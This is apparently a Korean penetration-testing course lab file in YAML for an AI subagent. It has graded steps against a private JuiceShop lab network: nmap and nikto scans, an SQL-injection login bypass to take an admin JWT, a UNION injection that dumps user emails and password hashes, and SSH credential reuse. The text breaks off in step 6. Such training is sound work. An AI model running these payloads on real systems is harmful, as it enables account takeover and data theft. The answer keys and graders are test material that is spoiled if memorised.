lab_id: attack-ai-week15
title: 종합 모의해킹 (Full Pentest) (AI 지원)
version: ai
course: attack-ai
week: 15
description: 14주 동안 배운 모든 기법을 종합하여 실습 인프라에 대한 완전한 모의해킹을 수행한다. 정찰부터 보고서 작성까지 전체 모의해킹
  라이프사이클을 경험한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: medium
duration_minutes: 120
objectives:
- 모의해킹의 전체 단계(Recon -> Scan -> Exploit -> Post-Exploit -> Report)를 독립적으로 수행한다
- 발견된 취약점을 CVSS로 평가하고 전문적인 보고서를 작성한다
- 모의해킹 결과를 기반으로 실효적 보안 강화 방안을 제시한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 'Phase 1 - 정찰: 대상 네트워크(10.20.30.0/24)의 활성 호스트를 발견하고, 각 호스트의 열린 포트와
    서비스를 식별하라.'
  hint: nmap -sn으로 호스트 발견 후 -sV로 서비스 탐지를 수행한다
  category: recon
  points: 10
  answer: '🤖 프롬프트: Phase 1 - 정찰: 대상 네트워크(10.20.30.0/24)의 활성 호스트를 발견하고, 각 호스트의 열린 포트와
    서비스를 식별해줘

    📎 참고 (CLI): sudo nmap -sn 10.20.30.0/24 --max-retries 1 --host-timeout 15s -T4
    && echo ''===== Service Detection ====='' && sudo nmap -sV -T4 --max-retries 1
    --host-timeout 15s --top-ports 100 10.20.30.1 10.20.30.80 10.20.30.100'
  answer_detail: 모의해킹의 첫 단계는 대상 범위(scope) 내 모든 자산을 식별하는 것이다. 호스트 발견 -> 포트 스캔 -> 서비스/버전
    탐지 순서로 수행하며, 결과를 체계적으로 기록한다.
  verify:
    type: output_contains
    expect: Nmap scan report
    field: stdout
    semantic:
      intent: Phase 1 정찰 — 대상 네트워크 10.20.30.0/24 전체에 sudo nmap -sn (ping sweep)으로
        활성 호스트 발견 → sudo nmap -sV --top-ports 100 으로 각 호스트의 서비스/버전 탐지. --max-retries
        1 --host-timeout 15s -T4 로 속도 최적화. 모의해킹 범위 내 자산 식별 → 포트 → 서비스 순서 체계적 기록
      success_criteria:
      - nmap -sn + nmap -sV 두 단계 스캔 모두 실행
      - Nmap scan report 키워드 또는 서비스 탐지 결과 출력
      - 10.20.30.0/24 또는 특정 서버 3개(1/80/100) 대상 명시
      acceptable_methods:
      - sudo nmap -sn + sudo nmap -sV -T4
      - fping / nmap -PE/-PP/-PM 대체 ping
      - masscan --rate 1000 + nmap -sV 2-stage
      - rustscan + nmap NSE integration
      negative_signs:
      - 단일 호스트만 스캔 (/24 범위 없음)
      - 서비스 탐지 생략 (ping sweep 만)
      - 기록/범위 언급 없음
  target_vm: attacker
  script: sudo nmap -sn 10.20.30.0/24 --max-retries 1 --host-timeout 15s -T4 && echo
    '===== Service Detection =====' && sudo nmap -sV -T4 --max-retries 1 --host-timeout
    15s --top-ports 100 10.20.30.1 10.20.30.80 10.20.30.100
  risk_level: low
  bastion_prompt: 'Phase 1 - 정찰: 대상 네트워크(10.20.30.0/24)의 활성 호스트를 발견하고, 각 호스트의 열린 포트와
    서비스를 식별해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 2
  instruction: 'Phase 1 - 웹 정찰: JuiceShop({{WEB_IP}}:3000)의 기술 스택, API 엔드포인트, 공개 파일을
    수집하라.'
  hint: whatweb, robots.txt, /ftp, /api 등을 종합적으로 조사한다
  category: recon
  points: 10
  answer: '🤖 프롬프트: Phase 1 - 웹 정찰: JuiceShop(10.20.30.80:3000)의 기술 스택, API 엔드포인트,
    공개 파일을 수집해줘

    📎 참고 (CLI): echo ''=== Web Recon ==='' && curl -sI http://10.20.30.80:3000 | head
    -10 && echo ''--- robots.txt ---'' && curl -s http://10.20.30.80:3000/robots.txt
    && echo ''--- /ftp ---'' && curl -s http://10.20.30.80:3000/ftp | head -10 &&
    echo ''--- API ---'' && curl -s http://10.20.30.80:3000/api/Products | python3
    -c ''import sys,json; print(f"Products: {len(json.load(sys.stdin)["data"])}")''
    2>/dev/null'
  answer_detail: 웹 정찰에서는 서버 헤더, robots.txt, 디렉토리 리스팅, API 엔드포인트, JavaScript 소스를 모두
    분석한다. 수집된 정보의 양과 질이 이후 공격의 성공률을 결정한다.
  verify:
    type: output_contains
    expect: Web Recon
    field: stdout
    semantic:
      intent: 'Phase 1 웹 정찰 — JuiceShop(10.20.30.80:3000) 대상 5종 정찰: curl -sI 헤더(기술
        스택·서버 버전) + /robots.txt(숨겨진 경로) + /ftp(디렉토리 리스팅) + /api/Products(API 엔드포인트·데이터)
        + python json.load 로 데이터 수 카운트. 후속 공격의 기반 정보 수집'
      success_criteria:
      - Web Recon 키워드 + 최소 3개 수집 포인트 (헤더/robots/ftp/API 중)
      - curl + python JSON 파싱으로 구조화된 정보 추출
      - 정찰 결과가 이후 공격 벡터 식별로 연결됨 명시
      acceptable_methods:
      - curl -sI + curl -s /robots.txt + curl -s /api/...
      - whatweb http://<target>:3000
      - wappalyzer / wafw00f / nikto -Tuning=b
      - gobuster dir -u <url> -w wordlist
      negative_signs:
      - 정찰 포인트 2개 이하
      - API/robots 같은 웹 특유 수집 누락
      - 후속 공격과의 연결 언급 없음
  target_vm: attacker
  script: 'echo ''=== Web Recon ==='' && curl -sI http://10.20.30.80:3000 | head -10
    && echo ''--- robots.txt ---'' && curl -s http://10.20.30.80:3000/robots.txt &&
    echo ''--- /ftp ---'' && curl -s http://10.20.30.80:3000/ftp | head -10 && echo
    ''--- API ---'' && curl -s http://10.20.30.80:3000/api/Products | python3 -c ''import
    sys,json; print(f"Products: {len(json.load(sys.stdin)["data"])}")'' 2>/dev/null'
  risk_level: low
  bastion_prompt: 'Phase 1 - 웹 정찰: JuiceShop(10.20.30.80:3000)의 기술 스택, API 엔드포인트,
    공개 파일을 수집해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 3
  instruction: 'Phase 2 - 취약점 스캔: Nikto와 nmap NSE 스크립트로 웹 서버의 취약점을 자동 스캔하라.'
  hint: nikto -h와 nmap --script vuln을 실행한다
  category: analysis
  points: 10
  answer: '🤖 프롬프트: Phase 2 - 취약점 스캔: Nikto와 nmap NSE 스크립트로 웹 서버의 취약점을 자동 스캔해줘

    📎 참고 (CLI): echo ''=== Nikto Scan ==='' && nikto -h http://10.20.30.80:3000 -maxtime
    60 2>/dev/null | tail -20 && echo ''=== NSE Vuln Scan ==='' && nmap --script vuln
    -p 3000 10.20.30.80 --max-retries 1 --host-timeout 15s -T4 2>/dev/null | head
    -30'
  answer_detail: 자동화 스캐너의 결과는 시작점이며, 오탐(false positive)을 수동으로 검증해야 한다. 여러 도구의 결과를
    교차 확인하면 탐지율을 높이고 오탐을 줄일 수 있다.
  verify:
    type: output_contains
    expect:
    - Scan
    - Start
    - Server
    field: stdout
    semantic:
      intent: Phase 2 자동 취약점 스캔 — nikto -h http://<web>:3000 -maxtime 60 로 웹 서버 취약점
        + nmap --script vuln -p 3000 NSE 스크립트로 네트워크 수준 취약점 교차 확인. 자동화 결과는 시작점, 오탐은
        수동 검증 필요
      success_criteria:
      - Nikto Scan + NSE Vuln Scan 두 도구 모두 실행
      - 웹(nikto) + 네트워크(nmap NSE) 양쪽 수준 커버
      - 자동 스캐너 결과 오탐 검증 필요 언급
      acceptable_methods:
      - nikto -h + nmap --script vuln
      - OWASP ZAP 자동 스캔
      - sqlmap --level=5 --risk=3 auto 탐지
      - acunetix / burp suite active scan
      negative_signs:
      - 도구 1개만 사용 (교차 검증 없음)
      - 오탐 검증 또는 수동 확인 언급 없음
      - 스캔 결과 해석·우선순위 없음
  target_vm: attacker
  script: echo '=== Nikto Scan ===' && nikto -h http://10.20.30.80:3000 -maxtime 60
    2>/dev/null | tail -20 && echo '=== NSE Vuln Scan ===' && nmap --script vuln -p
    3000 10.20.30.80 --max-retries 1 --host-timeout 15s -T4 2>/dev/null | head -30
  risk_level: low
  bastion_prompt: 'Phase 2 - 취약점 스캔: Nikto와 nmap NSE 스크립트로 웹 서버의 취약점을 자동 스캔해줘'
- order: 4
  instruction: 'Phase 3 - 초기 접근: SQL Injection을 사용하여 JuiceShop 관리자 계정으로 접근하라. JWT
    토큰을 획득하라.'
  hint: 이전 week에서 배운 SQLi 기법을 적용한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: Phase 3 - 초기 접근: SQL Injection을 사용하여 JuiceShop 관리자 계정으로 접근하라. JWT
    토큰을 획득해줘

    📎 참고 (CLI): TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H
    ''Content-Type: application/json'' -d ''{"email":"\'' OR 1=1--","password":"a"}''
    | python3 -c "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
    && echo "Admin token acquired: ${TOKEN:0:50}..."'
  answer_detail: SQL Injection을 통한 인증 우회는 웹 애플리케이션의 가장 위험한 취약점 중 하나이다. CVSS 9.8(Critical)에
    해당하며, 데이터베이스 전체에 대한 접근이 가능할 수 있다.
  verify:
    type: output_contains
    expect: Admin token acquired
    field: stdout
    semantic:
      intent: 'Phase 3 초기 접근 — SQLi 인증 우회 공격 /rest/user/login POST 에 {email: '' OR
        1=1--, password: a} JSON 페이로드로 관리자 JWT 토큰 탈취. python json.load 로 token 필드
        파싱 후 ${TOKEN:0:50} 출력. CVSS 9.8 Critical 인증 우회 취약점 실증'
      success_criteria:
      - /rest/user/login 또는 유사 인증 엔드포인트 POST
      - ''' OR 1=1-- 또는 동등한 SQLi 페이로드 주입'
      - Admin token acquired 또는 유사 성공 메시지 + JWT 토큰 일부 출력
      acceptable_methods:
      - curl -X POST + JSON body 에 SQLi
      - sqlmap -u <url> --level=5 --risk=3 --technique=B
      - Burp Repeater 로 페이로드 수동 테스트
      - python requests 로 자동화
      negative_signs:
      - SQLi 페이로드 없이 정상 로그인
      - JWT 토큰 추출 실패 또는 미검증
      - CVSS 평가/Critical 등급 언급 없음
  target_vm: attacker
  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
    application/json'' -d ''{"email":"\'' OR 1=1--","password":"a"}'' | python3 -c
    "import sys,json; print(json.load(sys.stdin)[''authentication''][''token''])")
    && echo "Admin token acquired: ${TOKEN:0:50}..."'
  risk_level: medium
  bastion_prompt: 'Phase 3 - 초기 접근: SQL Injection을 사용하여 JuiceShop 관리자 계정으로 접근하라. JWT
    토큰을 획득해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 5
  instruction: 'Phase 3 - 데이터 추출: UNION 기반 SQL Injection으로 데이터베이스의 사용자 정보(이메일, 비밀번호
    해시)를 추출하라.'
  hint: UNION SELECT를 활용하여 Users 테이블의 데이터를 추출한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: Phase 3 - 데이터 추출: UNION 기반 SQL Injection으로 데이터베이스의 사용자 정보(이메일,
    비밀번호 해시)를 추출해줘

    📎 참고 (CLI): curl -s ''http://10.20.30.80:3000/rest/products/search?q=test%27%29%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--''
    2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); [print(f\"{p.get(''name'','''')}:
    {p.get(''description'','''')}\") for p in d.get(''data'',[])]" 2>/dev/null | head
    -10'
  answer_detail: UNION SQLi로 Users 테이블의 데이터를 추출하면 모든 사용자의 이메일과 비밀번호 해시를 얻을 수 있다. 실전에서는
    이 해시를 오프라인 크래킹하여 평문 비밀번호를 복원한다.
  verify:
    type: output_contains
    expect: '@'
    field: stdout
    semantic:
      intent: Phase 3 데이터 추출 — UNION 기반 SQLi 공격 /rest/products/search?q=test')%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--
        로 Users 테이블 email/password 해시 추출. python json.load 로 name/description 필드 파싱
        후 이메일 @ 포함 행 확인. 오프라인 해시 크래킹으로 평문 복원 가능
      success_criteria:
      - UNION SELECT email, password FROM Users 또는 동등한 payload
      - '@ 포함된 이메일 문자열이 응답에 노출'
      - 오프라인 해시 크래킹으로 평문 복원 가능성 언급
      acceptable_methods:
      - curl + URL-encoded UNION SQLi
      - sqlmap -u <url> --dump -T Users
      - python requests 로 iterate 후 데이터 수집
      - Burp Repeater + 컬럼 수 매칭
      negative_signs:
      - UNION 없이 기본 쿼리만
      - Users 테이블 접근 실패
      - 해시 크래킹 후속 단계 언급 없음
  target_vm: attacker
  script: 'curl -s ''http://10.20.30.80:3000/rest/products/search?q=test%27%29%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--''
    2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); [print(f\"{p.get(''name'','''')}:
    {p.get(''description'','''')}\") for p in d.get(''data'',[])]" 2>/dev/null | head
    -10'
  risk_level: medium
  bastion_prompt: 'Phase 3 - 데이터 추출: UNION 기반 SQL Injection으로 데이터베이스의 사용자 정보(이메일,
    비밀번호 해시)를 추출해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 6
  instruction: 'Phase 4 - 측면 이동: web 서버에서 secu 서버({{SECU_IP}})로 SSH 접속하라. 자격 증명 재사용을
    확인하라.'
  hint: 동일한 비밀번호로 다른 서버에 접속을 시도한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: Phase 4 - 측면 이동: web 서버에서 secu 서버(10.20.30.1)로 SSH 접속해줘

    📎 참고 (CLI): ssh ccc@10.20.30.80 ''ssh ccc@10.20.30.1 "hostname && id" 2>/dev/null''
    2>/dev/null && echo ''=== Lateral movement: web -> secu SUCCESS ==='''
  answer_detail: 자격 증명 재사용은 실전 모의해킹에서 가장 흔한 측면 이동 벡터이다. 한 시스템에서 획득한 비밀번호로 다른 시스템에
    접근할 수 있으면 도메인 전체가 위험하다.
  verify:
    type: output_contains
    expect: Lateral movement
    field: stdout
    semantic:
      intent: Phase 4 측면 이동 — 자격 증명 재사용 공격. ssh ccc@web 에서 동일 비밀번호로 ssh ccc@secu 로
        중첩 접속 (ssh ccc@10.20.30.80 'ssh ccc@10.20.30.1 hostname && id'). 성공 시 web→secu
        경로 확보. 한 시스템의 비밀번호 노출이 도메인 전체로 확산되는 실전 패턴
      success_criteria:
